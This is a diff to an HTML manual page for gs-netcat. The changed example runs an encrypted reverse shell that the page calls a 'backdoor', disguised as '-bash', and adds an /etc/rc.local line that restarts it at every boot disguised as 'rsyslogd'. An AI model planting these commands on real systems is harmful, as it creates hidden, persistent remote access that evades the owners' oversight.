@@ -322,10 +322,17 @@ The sftp-server binary speaks the sftp-protocol to stdin/stdout. The sftp binary
 
 - Encrypted Reverse PTY shell hidden as '-bash' in the process list - also known as 'backdoor':
 
-<BLOCKQUOTE><TT>$ export GSOCKET_ARGS='-s MySecret -l -i -D'</TT></BLOCKQUOTE>
+<BLOCKQUOTE><TT>$ export GSOCKET_ARGS='-s MySecret -liqD'</TT></BLOCKQUOTE>
 
-<BLOCKQUOTE><TT>$ exec -a -bash gs-netcat</TT></BLOCKQUOTE>
- 
+<BLOCKQUOTE><TT>$ (exec -a -bash gs-netcat)</TT></BLOCKQUOTE>
+<P>
+
+The following line in /etc/rc.local starts the backdoor after each system reboot:
+
+<BLOCKQUOTE><TT>(GSOCKET_ARGS=&quot;-s MySecret -liqD&quot; SHELL=&quot;/bin/bash&quot; exec -a rsyslogd /usr/local/bin/gs-netcat)</TT></BLOCKQUOTE>
+<P>
+
+The '(...)' brackets start a sub-shell which is then replaced (by exec) with the gs-netcat process. The process is hidden (as rsyslogd) from the process list. Set SHELL=/bin/bash to use bash instead of /bin/sh.
 <P>
 
 Client to connect to the backdoor:
@@ -461,6 +468,6 @@ Efforts have been made to have
 This document was created by
 <A HREF="http://hackerschoice.github.io/">man2html</A>,
 using the manual pages.<BR>
-Time: 10:55:33 GMT, October 24, 2020
+Time: 13:40:24 GMT, October 30, 2020
 </BODY>
 </HTML>
